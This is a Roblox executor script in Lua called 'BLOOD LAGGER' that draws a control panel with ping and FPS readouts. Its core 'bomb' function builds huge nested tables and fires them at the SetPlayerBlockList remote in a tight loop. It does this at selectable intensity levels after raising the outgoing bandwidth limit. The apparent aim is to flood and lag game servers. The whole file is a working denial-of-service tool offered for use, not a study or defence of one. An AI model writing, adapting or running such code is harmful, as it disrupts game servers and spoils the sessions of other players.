local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = game:GetService("Players").LocalPlayer
local ConfigFile = "IrishLaggerConfig.json"

-- ⚙️ LAGGER
local NIVELES = {Low = {poder = 23}, Mid = {poder = 32}, High = {poder = 70}}
local laggerActive = false
local lagThread = nil
local nivelActual = "High"

local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

local function SaveConfig()
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode({Nivel = nivelActual})) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function() nivelActual = HttpService:JSONDecode(readfile(ConfigFile)).Nivel or "High" end)
    end
end
LoadConfig()

-- 📊 PING E FPS NA TELA
local Display = Instance.new("Frame", CoreGui)
Display.Size = UDim2.new(0, 160, 0, 44)
Display.Position = UDim2.new(0, 10, 0, 10)
Display.BackgroundColor3 = Color3.fromRGB(0,0,0)
Display.BackgroundTransparency = 0.5
Display.BorderSizePixel = 0
Instance.new("UICorner", Display).CornerRadius = UDim.new(0, 6)

local PingText = Instance.new("TextLabel", Display)
PingText.Size = UDim2.new(1,0,0,22)
PingText.Position = UDim2.new(0,0,0,0)
PingText.BackgroundTransparency = 1
PingText.Text = "📡 Ping: 0 ms"
PingText.Font = Enum.Font.GothamBold
PingText.TextSize = 13
PingText.TextColor3 = Color3.fromRGB(255,255,255)

local FPSText = Instance.new("TextLabel", Display)
FPSText.Size = UDim2.new(1,0,0,22)
FPSText.Position = UDim2.new(0,0,0,22)
FPSText.BackgroundTransparency = 1
FPSText.Text = "🎮 FPS: 0"
FPSText.Font = Enum.Font.GothamBold
FPSText.TextSize = 13
FPSText.TextColor3 = Color3.fromRGB(255,255,255)

-- 🔄 ATUALIZAR
task.spawn(function()
    while true do
        task.wait(0.3)
        pcall(function()
            local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            PingText.Text = "📡 Ping: " .. ping .. " ms"
            PingText.TextColor3 = ping < 50 and Color3.fromRGB(0,255,0) or ping < 100 and Color3.fromRGB(255,255,0) or ping < 200 and Color3.fromRGB(255,165,0) or Color3.fromRGB(255,0,0)
            
            local fps = math.floor(1 / RunService.Heartbeat:Wait())
            FPSText.Text = "🎮 FPS: " .. fps
            FPSText.TextColor3 = fps >= 60 and Color3.fromRGB(0,255,0) or fps >= 30 and Color3.fromRGB(255,255,0) or fps >= 15 and Color3.fromRGB(255,165,0) or Color3.fromRGB(255,0,0)
        end)
    end
end)

-- 🖱️ DRAG DO DISPLAY
local dragging, dragInput, dragStart, startPos
Display.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true; dragStart = i.Position; startPos = Display.Position
        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
Display.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement then dragInput = i end end)
UserInputService.InputChanged:Connect(function(i)
    if i == dragInput and dragging then
        local d = i.Position - dragStart
        Display.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

-- 🖥️ INTERFACE PRINCIPAL
local GUI = Instance.new("ScreenGui", CoreGui)
GUI.Name = "BLOODLagger"
GUI.ResetOnSpawn = false

local Main = Instance.new("Frame", GUI)
Main.Size = UDim2.new(0, 340, 0, 200)
Main.Position = UDim2.new(0.5, -170, 0.5, -100)
Main.BackgroundColor3 = Color3.fromRGB(20,20,25)
Main.BackgroundTransparency = 0.5
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)

-- IMAGEM DE FUNDO
local Bg = Instance.new("ImageLabel", Main)
Bg.Size = UDim2.new(1,0,1,0)
Bg.BackgroundTransparency = 1
Bg.Image = "rbxassetid://132256694893892"
Bg.ScaleType = Enum.ScaleType.Crop

-- OVERLAY
local Ov = Instance.new("Frame", Main)
Ov.Size = UDim2.new(1,0,1,0)
Ov.BackgroundColor3 = Color3.fromRGB(0,0,0)
Ov.BackgroundTransparency = 0.5
Ov.BorderSizePixel = 0

local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(100,0,0)
Stroke.Thickness = 2

-- TÍTULO
local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(0, 150, 0, 28)
Title.Position = UDim2.new(0, 12, 0, 8)
Title.BackgroundTransparency = 1
Title.Text = "BLOOD LAGGER"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.TextColor3 = Color3.fromRGB(255,50,50)
Title.TextXAlignment = Enum.TextXAlignment.Left

-- STATUS
local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(0, 70, 0, 28)
Status.Position = UDim2.new(1, -82, 0, 8)
Status.BackgroundTransparency = 1
Status.Text = "OFF"
Status.Font = Enum.Font.GothamBold
Status.TextSize = 15
Status.TextColor3 = Color3.fromRGB(235,110,110)
Status.TextXAlignment = Enum.TextXAlignment.Right

-- DIVISOR
local Div = Instance.new("Frame", Main)
Div.Size = UDim2.new(1, -24, 0, 1)
Div.Position = UDim2.new(0, 12, 0, 38)
Div.BackgroundColor3 = Color3.fromRGB(100,0,0)
Div.BorderSizePixel = 0

-- BOTÃO LAGGER
local LaggerBtn = Instance.new("TextButton", Main)
LaggerBtn.Size = UDim2.new(1, -24, 0, 40)
LaggerBtn.Position = UDim2.new(0, 12, 0, 48)
LaggerBtn.BackgroundColor3 = Color3.fromRGB(30,30,35)
LaggerBtn.BackgroundTransparency = 0.3
LaggerBtn.BorderSizePixel = 0
LaggerBtn.Text = ""
Instance.new("UICorner", LaggerBtn).CornerRadius = UDim.new(0, 10)
local LaggerStroke = Instance.new("UIStroke", LaggerBtn)
LaggerStroke.Color = Color3.fromRGB(100,0,0)
LaggerStroke.Thickness = 1.5

local Circle = Instance.new("Frame", LaggerBtn)
Circle.Size = UDim2.new(0, 24, 0, 24)
Circle.Position = UDim2.new(0, 8, 0.5, -12)
Circle.BackgroundTransparency = 1
Instance.new("UICorner", Circle).CornerRadius = UDim.new(1,0)
local CircleStroke = Instance.new("UIStroke", Circle)
CircleStroke.Color = Color3.fromRGB(255,255,255)
CircleStroke.Thickness = 1.5

local Icon = Instance.new("TextLabel", Circle)
Icon.Size = UDim2.new(1,0,1,0)
Icon.BackgroundTransparency = 1
Icon.Text = "⚡"
Icon.Font = Enum.Font.GothamBold
Icon.TextSize = 14
Icon.TextColor3 = Color3.fromRGB(255,255,255)

local Lbl = Instance.new("TextLabel", LaggerBtn)
Lbl.Size = UDim2.new(0, 70, 1, 0)
Lbl.Position = UDim2.new(0, 40, 0, 0)
Lbl.BackgroundTransparency = 1
Lbl.Text = "LAGGER"
Lbl.Font = Enum.Font.GothamBold
Lbl.TextSize = 15
Lbl.TextColor3 = Color3.fromRGB(255,255,255)
Lbl.TextXAlignment = Enum.TextXAlignment.Left

local EnableBtn = Instance.new("TextButton", LaggerBtn)
EnableBtn.Size = UDim2.new(0, 75, 1, 0)
EnableBtn.Position = UDim2.new(1, -83, 0, 0)
EnableBtn.BackgroundColor3 = Color3.fromRGB(40,40,45)
EnableBtn.BackgroundTransparency = 0.3
EnableBtn.BorderSizePixel = 0
EnableBtn.Text = "ENABLE"
EnableBtn.Font = Enum.Font.GothamBold
EnableBtn.TextSize = 12
EnableBtn.TextColor3 = Color3.fromRGB(200,200,200)
Instance.new("UICorner", EnableBtn).CornerRadius = UDim.new(0, 6)

-- BOTÕES LOW/MID/HIGH
local Container = Instance.new("Frame", Main)
Container.Size = UDim2.new(1, -24, 0, 34)
Container.Position = UDim2.new(0, 12, 0, 100)
Container.BackgroundTransparency = 1

local Layout = Instance.new("UIListLayout", Container)
Layout.FillDirection = Enum.FillDirection.Horizontal
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.Padding = UDim.new(0, 6)

local function createLevelBtn(parent, name, color)
    local btn = Instance.new("TextButton", parent)
    btn.Name = name.."Button"
    btn.Size = UDim2.new(0, 90, 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(30,30,35)
    btn.BackgroundTransparency = 0.3
    btn.BorderSizePixel = 0
    btn.Text = ""
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(0,0,0)
    stroke.Thickness = 1.5
    
    local lbl = Instance.new("TextLabel", btn)
    lbl.Size = UDim2.new(1,0,1,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = name
    lbl.Font = Enum.Font.LuckiestGuy
    lbl.TextSize = 18
    lbl.TextColor3 = Color3.fromRGB(200,200,200)
    return btn, stroke, lbl
end

local LowBtn, LowStroke, LowLbl = createLevelBtn(Container, "LOW")
local MidBtn, MidStroke, MidLbl = createLevelBtn(Container, "MID")
local HighBtn, HighStroke, HighLbl = createLevelBtn(Container, "HIGH")

-- 🔄 FUNÇÕES
local function updateButtons()
    LowBtn.BackgroundColor3 = nivelActual == "Low" and Color3.fromRGB(40,20,20) or Color3.fromRGB(30,30,35)
    LowStroke.Color = nivelActual == "Low" and Color3.fromRGB(255,50,50) or Color3.fromRGB(0,0,0)
    LowLbl.TextColor3 = nivelActual == "Low" and Color3.fromRGB(255,50,50) or Color3.fromRGB(200,200,200)
    
    MidBtn.BackgroundColor3 = nivelActual == "Mid" and Color3.fromRGB(40,40,20) or Color3.fromRGB(30,30,35)
    MidStroke.Color = nivelActual == "Mid" and Color3.fromRGB(255,200,50) or Color3.fromRGB(0,0,0)
    MidLbl.TextColor3 = nivelActual == "Mid" and Color3.fromRGB(255,200,50) or Color3.fromRGB(200,200,200)
    
    HighBtn.BackgroundColor3 = nivelActual == "High" and Color3.fromRGB(20,40,20) or Color3.fromRGB(30,30,35)
    HighStroke.Color = nivelActual == "High" and Color3.fromRGB(50,255,50) or Color3.fromRGB(0,0,0)
    HighLbl.TextColor3 = nivelActual == "High" and Color3.fromRGB(50,255,50) or Color3.fromRGB(200,200,200)
end

local function toggleLagger()
    laggerActive = not laggerActive
    Status.Text = laggerActive and "ON" or "OFF"
    Status.TextColor3 = laggerActive and Color3.fromRGB(110,235,110) or Color3.fromRGB(235,110,110)
    CircleStroke.Color = laggerActive and Color3.fromRGB(110,235,110) or Color3.fromRGB(255,255,255)
    LaggerStroke.Color = laggerActive and Color3.fromRGB(110,235,110) or Color3.fromRGB(100,0,0)
    Stroke.Color = laggerActive and Color3.fromRGB(110,235,110) or Color3.fromRGB(100,0,0)
    EnableBtn.Text = laggerActive and "DISABLE" or "ENABLE"
    EnableBtn.TextColor3 = laggerActive and Color3.fromRGB(255,50,50) or Color3.fromRGB(200,200,200)
    
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🔘 EVENTOS
LaggerBtn.MouseButton1Click:Connect(toggleLagger)
EnableBtn.MouseButton1Click:Connect(toggleLagger)

local function setLevel(level)
    nivelActual = level
    updateButtons()
    SaveConfig()
    if laggerActive then
        if lagThread then task.cancel(lagThread); lagThread = nil end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    end
end

LowBtn.MouseButton1Click:Connect(function() setLevel("Low") end)
MidBtn.MouseButton1Click:Connect(function() setLevel("Mid") end)
HighBtn.MouseButton1Click:Connect(function() setLevel("High") end)

-- 🖱️ DRAG DA INTERFACE
local dragMain = false
Main.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragMain = true; dragStart = i.Position; startPos = Main.Position
        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragMain = false end end)
    end
end)
Main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement then dragInput = i end end)
UserInputService.InputChanged:Connect(function(i)
    if i == dragInput and dragMain then
        local d = i.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

-- ⌨️ F12
UserInputService.InputBegan:Connect(function(i, gp)
    if not gp and i.KeyCode == Enum.KeyCode.F12 then toggleLagger() end
end)

updateButtons()
print("✅ BLOOD Lagger CARREGADO!")
print("📊 Ping e FPS na tela | F12 liga/desliga")
